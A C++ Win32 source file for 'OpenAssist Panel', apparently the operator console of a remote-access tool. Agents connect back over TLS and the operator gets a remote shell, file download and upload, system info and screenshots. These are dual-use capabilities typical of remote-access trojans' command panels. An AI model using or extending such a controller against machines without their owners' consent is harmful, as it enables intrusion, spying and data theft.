#include "../common/proto.h"
#include "../common/tls.h"
#include <commctrl.h>
#include <commdlg.h>
#include <windowsx.h>
#include <vector>
#include <string>
#include <cstdio>

struct Client {
  TlsCtx tls;
  std::string host, user, os, addr;
  HWND shellWnd = nullptr, filesWnd = nullptr, infoWnd = nullptr, shotWnd = nullptr;
  HWND shellOut = nullptr, filesList = nullptr, filesPath = nullptr, infoText = nullptr;
  std::string shellPending;
  std::string shotBmp;
  bool dead = false;
};

static HINSTANCE g_inst;
static HWND g_main, g_list, g_port, g_status;
static std::vector<Client*> g_clients;
static CRITICAL_SECTION g_cs;
static volatile LONG g_listening = 0;
static SOCKET g_listenSock = INVALID_SOCKET;
static PCCERT_CONTEXT g_cert = nullptr;
static HCERTSTORE g_store = nullptr;

static bool LoadPfx(const char* path) {
  HANDLE f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                         OPEN_EXISTING, 0, nullptr);
  if (f == INVALID_HANDLE_VALUE) return false;
  DWORD sz = GetFileSize(f, nullptr);
  std::vector<BYTE> data(sz);
  DWORD n = 0;
  if (!ReadFile(f, data.data(), sz, &n, nullptr) || n != sz) {
    CloseHandle(f);
    return false;
  }
  CloseHandle(f);

  CRYPT_DATA_BLOB blob{ sz, data.data() };
  g_store = PFXImportCertStore(&blob, L"", 0);
  if (!g_store) return false;

  g_cert = CertFindCertificateInStore(g_store, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                                      0, CERT_FIND_ANY, nullptr, nullptr);
  return g_cert != nullptr;
}

static void AppendEdit(HWND ed, const std::string& s) {
  int len = GetWindowTextLengthA(ed);
  SendMessageA(ed, EM_SETSEL, len, len);
  SendMessageA(ed, EM_REPLACESEL, FALSE, (LPARAM)s.c_str());
}

static int FindClientIndex(Client* c) {
  LVFINDINFOA fi{};
  fi.flags = LVFI_PARAM;
  fi.lParam = (LPARAM)c;
  return ListView_FindItem(g_list, -1, &fi);
}

static Client* ClientAt(int idx) {
  if (idx < 0) return nullptr;
  LVITEMA it{}; it.mask = LVIF_PARAM; it.iItem = idx;
  if (!ListView_GetItem(g_list, &it)) return nullptr;
  return (Client*)it.lParam;
}

static void RefreshRow(Client* c) {
  int i = FindClientIndex(c);
  if (i < 0) return;
  ListView_SetItemText(g_list, i, 0, (LPSTR)c->host.c_str());
  ListView_SetItemText(g_list, i, 1, (LPSTR)c->user.c_str());
  ListView_SetItemText(g_list, i, 2, (LPSTR)c->os.c_str());
  ListView_SetItemText(g_list, i, 3, (LPSTR)c->addr.c_str());
}

static void DropClient(Client* c) {
  EnterCriticalSection(&g_cs);
  c->dead = true;
  if (c->tls.sock != INVALID_SOCKET) closesocket(c->tls.sock);
  LeaveCriticalSection(&g_cs);
  int i = FindClientIndex(c);
  if (i >= 0) ListView_DeleteItem(g_list, i);
  HWND* arr[] = { &c->shellWnd, &c->filesWnd, &c->infoWnd, &c->shotWnd };
  for (auto w : arr)
    if (*w) { DestroyWindow(*w); *w = nullptr; }
  delete c;
}

static DWORD WINAPI ClientThread(LPVOID p) {
  Client* c = (Client*)p;
  uint16_t cmd; std::string pl;
  for (;;) {
    if (!TlsRecvMsg(c->tls, cmd, pl)) break;
    switch (cmd) {
      case C_HELLO: {
        size_t a = pl.find('|');
        size_t b = (a != std::string::npos) ? pl.find('|', a + 1) : std::string::npos;
        if (a != std::string::npos) c->host = pl.substr(0, a);
        if (a != std::string::npos && b != std::string::npos) {
          c->user = pl.substr(a + 1, b - a - 1);
          c->os = pl.substr(b + 1);
        } else {
          c->os = "Windows";
        }
        int n = ListView_GetItemCount(g_list);
        LVITEMA it{}; it.mask = LVIF_TEXT | LVIF_PARAM;
        it.iItem = n; it.lParam = (LPARAM)c;
        it.pszText = (LPSTR)c->host.c_str();
        ListView_InsertItem(g_list, &it);
        RefreshRow(c);
        break;
      }
      case C_SHELL_DATA:
        if (c->shellWnd) AppendEdit(c->shellOut, pl);
        break;
      case C_SHELL_CLOSE:
        if (c->shellWnd) AppendEdit(c->shellOut, "\r\n[agent: shell exited]\r\n");
        break;
      case C_FS_LIST_RESP:
        if (c->filesWnd) {
          ListView_DeleteAllItems(c->filesList);
          size_t pos = 0;
          int i = 0;
          while (pos < pl.size()) {
            size_t e = pl.find('\n', pos);
            if (e == std::string::npos) e = pl.size();
            std::string line = pl.substr(pos, e - pos);
            pos = e + 1;
            size_t p1 = line.find('|');
            if (p1 == std::string::npos) continue;
            std::string name = line.substr(0, p1);
            std::string rest = line.substr(p1 + 1);
            LVITEMA it{}; it.mask = LVIF_TEXT; it.iItem = i;
            it.pszText = (LPSTR)name.c_str();
            int idx = ListView_InsertItem(c->filesList, &it);
            ListView_SetItemText(c->filesList, idx, 1, (LPSTR)rest.c_str());
            i++;
          }
        }
        break;
      case C_FS_FILE:
        if (c->filesWnd && !pl.empty()) {
          CreateDirectoryA("downloads", nullptr);
          std::string remote = c->shellPending;
          std::string name = remote;
          size_t slash = remote.find_last_of("\\/");
          if (slash != std::string::npos) name = remote.substr(slash + 1);
          if (name.empty()) name = "last.bin";
          std::string outPath = std::string("downloads\\") + name;
          HANDLE f = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, nullptr,
                                 CREATE_ALWAYS, 0, nullptr);
          if (f != INVALID_HANDLE_VALUE) {
            DWORD n; size_t off = 0;
            while (off < pl.size()) {
              uint32_t chunk = (uint32_t)(pl.size() - off < (1u << 20) ? pl.size() - off : (1u << 20));
              WriteFile(f, pl.data() + off, chunk, &n, nullptr);
              off += chunk;
            }
            CloseHandle(f);
          }
          MessageBoxA(c->filesWnd, outPath.c_str(), "Saved", MB_ICONINFORMATION);
        }
        break;
      case C_SYSINFO:
        if (c->infoWnd && c->infoText) {
          SetWindowTextA(c->infoText, pl.c_str());
        } else {
          MessageBoxA(g_main, pl.c_str(), "SysInfo", MB_ICONINFORMATION);
        }
        break;
      case C_SCREEN_IMG:
        c->shotBmp = pl;
        if (c->shotWnd) InvalidateRect(c->shotWnd, nullptr, TRUE);
        break;
      case C_BYE:
        goto out;
    }
  }
out:
  if (!c->dead) DropClient(c);
  return 0;
}

static DWORD WINAPI AcceptThread(LPVOID) {
  for (;;) {
    SOCKET s = accept(g_listenSock, nullptr, nullptr);
    if (s == INVALID_SOCKET) break;
    Client* c = new Client();
    c->tls.sock = s;
    c->addr = "pending";
    if (!TlsAcquire(c->tls, g_cert) || !TlsHandshake(c->tls)) {
      closesocket(s); delete c; continue;
    }
    EnterCriticalSection(&g_cs); g_clients.push_back(c); LeaveCriticalSection(&g_cs);
    CreateThread(nullptr, 0, ClientThread, c, 0, nullptr);
  }
  return 0;
}

#define IDC_SHELLIN 201
#define IDC_SHELLSEND 202

static LRESULT CALLBACK ShellProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
  Client* c = (Client*)GetWindowLongPtrA(h, GWLP_USERDATA);
  switch (m) {
    case WM_SIZE:
      if (c) {
        int w = LOWORD(lp), ht = HIWORD(lp);
        MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht - 34, TRUE);
        MoveWindow(GetDlgItem(h, IDC_SHELLIN), 4, ht - 30, w - 90, 24, TRUE);
        MoveWindow(GetDlgItem(h, IDC_SHELLSEND), w - 82, ht - 30, 78, 24, TRUE);
      }
      return 0;
    case WM_COMMAND:
      if (LOWORD(wp) == IDC_SHELLSEND && c) {
        char buf[1024];
        HWND in = GetDlgItem(h, IDC_SHELLIN);
        GetWindowTextA(in, buf, sizeof(buf));
        SetWindowTextA(in, "");
        std::string s = buf; s += "\r\n";
        TlsSendMsg(c->tls, C_SHELL_DATA, s.data(), (uint32_t)s.size());
      }
      return 0;
    case WM_DESTROY:
      if (c) c->shellWnd = nullptr;
      return 0;
  }
  return DefWindowProcA(h, m, wp, lp);
}

#define IDC_FPATH 301
#define IDC_FREFRESH 302
#define IDC_FGET 303
#define IDC_FPUT 304

static LRESULT CALLBACK FilesProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
  Client* c = (Client*)GetWindowLongPtrA(h, GWLP_USERDATA);
  switch (m) {
    case WM_SIZE:
      if (c) {
        int w = LOWORD(lp), ht = HIWORD(lp);
        MoveWindow(GetDlgItem(h, IDC_FPATH), 4, 4, w - 96, 24, TRUE);
        MoveWindow(GetDlgItem(h, IDC_FREFRESH), w - 88, 4, 84, 24, TRUE);
        MoveWindow(GetDlgItem(h, IDC_FGET), 4, ht - 28, 90, 24, TRUE);
        MoveWindow(GetDlgItem(h, IDC_FPUT), 98, ht - 28, 90, 24, TRUE);
        MoveWindow(GetDlgItem(h, 1), 0, 32, w, ht - 66, TRUE);
      }
      return 0;
    case WM_COMMAND:
      if (!c) return 0;
      if (LOWORD(wp) == IDC_FREFRESH) {
        char p[MAX_PATH];
        GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
        std::string s(p);
        TlsSendMsg(c->tls, C_FS_LIST, s.data(), (uint32_t)s.size());
      }
      if (LOWORD(wp) == IDC_FGET) {
        char name[MAX_PATH];
        int sel = ListView_GetNextItem(GetDlgItem(h, 1), -1, LVNI_SELECTED);
        if (sel < 0) return 0;
        ListView_GetItemText(GetDlgItem(h, 1), sel, 0, name, sizeof(name));
        char p[MAX_PATH];
        GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
        std::string full = p;
        if (full.empty()) full = "C:\\";
        if (full.back() != '\\' && full.back() != '/') full += "\\";
        full += name;
        c->shellPending = full;
        TlsSendMsg(c->tls, C_FS_GET, full.data(), (uint32_t)full.size());
      }
      if (LOWORD(wp) == IDC_FPUT) {
        char file[MAX_PATH] = {};
        OPENFILENAMEA ofn{};
        ofn.lStructSize = sizeof(ofn);
        ofn.hwndOwner = h;
        ofn.lpstrFile = file;
        ofn.nMaxFile = MAX_PATH;
        ofn.lpstrTitle = "Upload to agent";
        if (!GetOpenFileNameA(&ofn)) return 0;
        char p[MAX_PATH];
        GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
        std::string dest = p;
        if (dest.empty()) dest = "C:\\";
        if (dest.back() != '\\' && dest.back() != '/') dest += "\\";
        const char* base = strrchr(file, '\\');
        dest += base ? base + 1 : file;
        HANDLE f = CreateFileA(file, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (f == INVALID_HANDLE_VALUE) return 0;
        std::string data, buf(1 << 20, 0);
        DWORD n;
        while (ReadFile(f, buf.data(), (DWORD)buf.size(), &n, nullptr) && n)
          data.append(buf, 0, n);
        CloseHandle(f);
        data = dest + "\n" + data;
        TlsSendMsg(c->tls, C_FS_PUT, data.data(), (uint32_t)data.size());
      }
      return 0;
    case WM_DESTROY:
      if (c) c->filesWnd = nullptr;
      return 0;
  }
  return DefWindowProcA(h, m, wp, lp);
}

static LRESULT CALLBACK ShotProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
  Client* c = (Client*)GetWindowLongPtrA(h, GWLP_USERDATA);
  switch (m) {
    case WM_PAINT: {
      PAINTSTRUCT ps;
      HDC dc = BeginPaint(h, &ps);
      if (c && c->shotBmp.size() > sizeof(BITMAPFILEHEADER)) {
        BITMAPFILEHEADER* fh = (BITMAPFILEHEADER*)c->shotBmp.data();
        BITMAPINFO* bi = (BITMAPINFO*)(c->shotBmp.data() + sizeof(*fh));
        void* px = (void*)(c->shotBmp.data() + fh->bfOffBits);
        RECT rc;
        GetClientRect(h, &rc);
        SetStretchBltMode(dc, HALFTONE);
        StretchDIBits(dc, 0, 0, rc.right, rc.bottom, 0, 0,
                      bi->bmiHeader.biWidth, bi->bmiHeader.biHeight,
                      px, bi, DIB_RGB_COLORS, SRCCOPY);
      } else {
        const char* msg = "no screenshot yet";
        TextOutA(dc, 10, 10, msg, (int)strlen(msg));
      }
      EndPaint(h, &ps);
      return 0;
    }
    case WM_DESTROY:
      if (c) c->shotWnd = nullptr;
      return 0;
  }
  return DefWindowProcA(h, m, wp, lp);
}

static LRESULT CALLBACK InfoProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
  Client* c = (Client*)GetWindowLongPtrA(h, GWLP_USERDATA);
  if (m == WM_SIZE) MoveWindow(GetDlgItem(h, 1), 0, 0, LOWORD(lp), HIWORD(lp), TRUE);
  if (m == WM_DESTROY && c) c->infoWnd = nullptr;
  return DefWindowProcA(h, m, wp, lp);
}

static HWND MakeChild(const char* cls, const char* title, WNDPROC proc, Client* c, int w, int h) {
  WNDCLASSA wc{};
  wc.lpfnWndProc = proc;
  wc.hInstance = g_inst;
  wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
  wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
  wc.lpszClassName = cls;
  RegisterClassA(&wc);
  HWND wnd = CreateWindowExA(0, cls, title, WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                             CW_USEDEFAULT, CW_USEDEFAULT, w, h,
                             g_main, nullptr, g_inst, nullptr);
  SetWindowLongPtrA(wnd, GWLP_USERDATA, (LONG_PTR)c);
  return wnd;
}

static void OpenShell(Client* c) {
  if (c->shellWnd) { SetForegroundWindow(c->shellWnd); return; }
  std::string title = "Shell — " + c->host;
  HWND h = MakeChild("OAShell", title.c_str(), ShellProc, c, 720, 500);
  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, nullptr);
  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_SHELLIN, g_inst, nullptr);
  CreateWindowExA(0, "BUTTON", "Send", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, 0, 0, 78, 24, h, (HMENU)IDC_SHELLSEND, g_inst, nullptr);
  c->shellWnd = h; c->shellOut = GetDlgItem(h, 1);
  // Принудительный ресайз чтобы все встало на места
  RECT rc; GetClientRect(h, &rc);
  SendMessageA(h, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
  TlsSendMsg(c->tls, C_SHELL_START, "", 0);
}

static void OpenFiles(Client* c) {
  if (c->filesWnd) { SetForegroundWindow(c->filesWnd); return; }
  std::string title = "Files — " + c->host;
  HWND h = MakeChild("OAFiles", title.c_str(), FilesProc, c, 760, 520);
  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "C:\\", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_FPATH, g_inst, nullptr);
  CreateWindowExA(0, "BUTTON", "Refresh", WS_CHILD | WS_VISIBLE, 0, 0, 84, 24, h, (HMENU)IDC_FREFRESH, g_inst, nullptr);
  HWND lv = CreateWindowExA(0, WC_LISTVIEWA, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 0, 0, 100, 100, h, (HMENU)1, g_inst, nullptr);
  ListView_SetExtendedListViewStyle(lv, LVS_EX_FULLROWSELECT);
  LVCOLUMNA col{}; col.mask = LVCF_TEXT | LVCF_WIDTH; col.pszText = (LPSTR)"Name"; col.cx = 300; ListView_InsertColumn(lv, 0, &col);
  col.pszText = (LPSTR)"Size|Attr"; col.cx = 160; ListView_InsertColumn(lv, 1, &col);
  CreateWindowExA(0, "BUTTON", "Download", WS_CHILD | WS_VISIBLE, 0, 0, 90, 24, h, (HMENU)IDC_FGET, g_inst, nullptr);
  CreateWindowExA(0, "BUTTON", "Upload", WS_CHILD | WS_VISIBLE, 0, 0, 90, 24, h, (HMENU)IDC_FPUT, g_inst, nullptr);
  c->filesWnd = h; c->filesList = lv;
  
  RECT rc; GetClientRect(h, &rc);
  SendMessageA(h, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
  SendMessage(GetDlgItem(h, IDC_FREFRESH), BM_CLICK, 0, 0);
}

static void OpenInfo(Client* c) {
  if (c->infoWnd) { SetForegroundWindow(c->infoWnd); return; }
  std::string title = "SysInfo — " + c->host;
  HWND h = MakeChild("OAInfo", title.c_str(), InfoProc, c, 480, 360);
  c->infoWnd = h;
  c->infoText = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "requesting...", WS_CHILD | WS_VISIBLE | ES_MULTILINE | WS_VSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, nullptr);
  
  RECT rc; GetClientRect(h, &rc);
  SendMessageA(h, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
  TlsSendMsg(c->tls, C_SYSINFO, "", 0);
}
static void OpenShot(Client* c) {
  if (!c->shotWnd) {
    std::string title = "Screen — " + c->host;
    c->shotWnd = MakeChild("OAShot", title.c_str(), ShotProc, c, 900, 560);
    RECT rc; GetClientRect(c->shotWnd, &rc);
    SendMessageA(c->shotWnd, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
  } else {
    SetForegroundWindow(c->shotWnd);
  }
  TlsSendMsg(c->tls, C_SCREEN, "", 0);
}

#define IDC_LIST 101
#define IDC_PORT 102
#define IDC_LISTEN 103
#define IDM_SHELL 200
#define IDM_FILES 201
#define IDM_INFO 202
#define IDM_SHOT 203
#define IDM_DROP 204

static LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
  switch (m) {
    case WM_SIZE: {
      int w = LOWORD(lp), ht = HIWORD(lp);
      MoveWindow(g_list, 0, 36, w, ht - 36 - 22, TRUE);
      MoveWindow(g_port, w - 210, 6, 60, 22, TRUE);
      MoveWindow(GetDlgItem(h, IDC_LISTEN), w - 140, 5, 100, 24, TRUE);
      SendMessage(g_status, WM_SIZE, 0, 0);
      return 0;
    }
    case WM_CONTEXTMENU: {
      if ((HWND)wp != g_list) break;
      POINT pt{ GET_X_LPARAM(lp), GET_Y_LPARAM(lp) };
      LVHITTESTINFO ht{};
      ht.pt = pt;
      ScreenToClient(g_list, &ht.pt);
      if (ListView_HitTest(g_list, &ht) < 0) break;
      int idx = ListView_GetNextItem(g_list, -1, LVNI_SELECTED);
      if (idx < 0) break;
      Client* c = ClientAt(idx);
      if (!c) break;
      HMENU menu = CreatePopupMenu();
      AppendMenuA(menu, MF_STRING, IDM_SHELL, "Remote shell");
      AppendMenuA(menu, MF_STRING, IDM_FILES, "File manager");
      AppendMenuA(menu, MF_STRING, IDM_INFO, "System info");
      AppendMenuA(menu, MF_STRING, IDM_SHOT, "Screenshot");
      AppendMenuA(menu, MF_SEPARATOR, 0, nullptr);
      AppendMenuA(menu, MF_STRING, IDM_DROP, "Disconnect client");
      TrackPopupMenu(menu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, h, nullptr);
      DestroyMenu(menu);
      return 0;
    }
    case WM_COMMAND: {
      if (LOWORD(wp) == IDC_LISTEN) {
        if (InterlockedExchange(&g_listening, 1)) return 0;
        char port[16];
        GetWindowTextA(g_port, port, sizeof(port));
        addrinfo* ai = nullptr;
        addrinfo hints{};
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        getaddrinfo(nullptr, *port ? port : "8443", &hints, &ai);
        g_listenSock = socket(AF_INET, SOCK_STREAM, 0);
        int one = 1;
        setsockopt(g_listenSock, SOL_SOCKET, SO_REUSEADDR, (char*)&one, sizeof(one));
        if (bind(g_listenSock, ai ? ai->ai_addr : nullptr,
                 (int)(ai ? ai->ai_addrlen : sizeof(sockaddr_in))) ||
            listen(g_listenSock, 16)) {
          MessageBoxA(h, "bind/listen failed", "OpenAssist", MB_ICONERROR);
          closesocket(g_listenSock);
          InterlockedExchange(&g_listening, 0);
          return 0;
        }
        if (ai) freeaddrinfo(ai);
        CreateThread(nullptr, 0, AcceptThread, nullptr, 0, nullptr);
        SendMessage(g_status, SB_SETTEXTA, 0, (LPARAM)"listening");
        return 0;
      }
      int idx = ListView_GetNextItem(g_list, -1, LVNI_SELECTED);
      if (idx < 0) return 0;
      Client* c = ClientAt(idx);
      if (!c) return 0;
      switch (LOWORD(wp)) {
        case IDM_SHELL: OpenShell(c); return 0;
        case IDM_FILES: OpenFiles(c); return 0;
        case IDM_INFO: OpenInfo(c); return 0;
        case IDM_SHOT: OpenShot(c); return 0;
        case IDM_DROP: TlsSendMsg(c->tls, C_BYE, "", 0); return 0;
      }
      return 0;
    }
    case WM_DESTROY:
      PostQuitMessage(0);
      return 0;
  }
  return DefWindowProcA(h, m, wp, lp);
}

int WINAPI WinMain(HINSTANCE inst, HINSTANCE, LPSTR, int) {
  g_inst = inst;
  InitializeCriticalSection(&g_cs);
  WSADATA w;
  WSAStartup(MAKEWORD(2, 2), &w);
  InitCommonControls();

  if (!LoadPfx("cert.pfx")) {
    MessageBoxA(nullptr,
        "Failed to load cert.pfx (generate with openssl, see docs).",
        "OpenAssist", MB_ICONERROR);
    return 1;
  }

  WNDCLASSA wc{};
  wc.lpfnWndProc = MainProc;
  wc.hInstance = inst;
  wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
  wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
  wc.lpszClassName = "OpenAssistPanel";
  wc.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
  RegisterClassA(&wc);

  g_main = CreateWindowExA(0, "OpenAssistPanel", "OpenAssist Panel",
      WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 860, 480,
      nullptr, nullptr, inst, nullptr);

  CreateWindowExA(0, "STATIC", "OpenAssist — operators console. Agents connect to you.",
      WS_CHILD | WS_VISIBLE, 10, 8, 400, 18, g_main, nullptr, inst, nullptr);
  CreateWindowExA(0, "STATIC", "port:", WS_CHILD | WS_VISIBLE, 0, 0, 1, 1,
      g_main, nullptr, inst, nullptr);
  g_port = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "8443",
      WS_CHILD | WS_VISIBLE | ES_NUMBER, 0, 0, 60, 22, g_main,
      (HMENU)IDC_PORT, inst, nullptr);
  CreateWindowExA(0, "BUTTON", "Start listening",
      WS_CHILD | WS_VISIBLE, 0, 0, 100, 24, g_main,
      (HMENU)IDC_LISTEN, inst, nullptr);

  g_list = CreateWindowExA(0, WC_LISTVIEWA, "",
      WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS,
      0, 36, 800, 300, g_main, (HMENU)IDC_LIST, inst, nullptr);
  ListView_SetExtendedListViewStyle(g_list, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
  struct { const char* t; int cx; } cols[] = {
      {"Host", 160}, {"User", 140}, {"OS", 120}, {"Addr", 160}};
  LVCOLUMNA col{};
  col.mask = LVCF_TEXT | LVCF_WIDTH;
  for (int i = 0; i < 4; i++) {
    col.pszText = (LPSTR)cols[i].t;
    col.cx = cols[i].cx;
    ListView_InsertColumn(g_list, i, &col);
  }

  g_status = CreateWindowExA(0, STATUSCLASSNAMEA, "idle",
      WS_CHILD | WS_VISIBLE, 0, 0, 800, 22, g_main, nullptr, inst, nullptr);

  ShowWindow(g_main, SW_SHOW);
  MSG msg;
  while (GetMessageA(&msg, nullptr, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessageA(&msg);
  }
  return 0;
}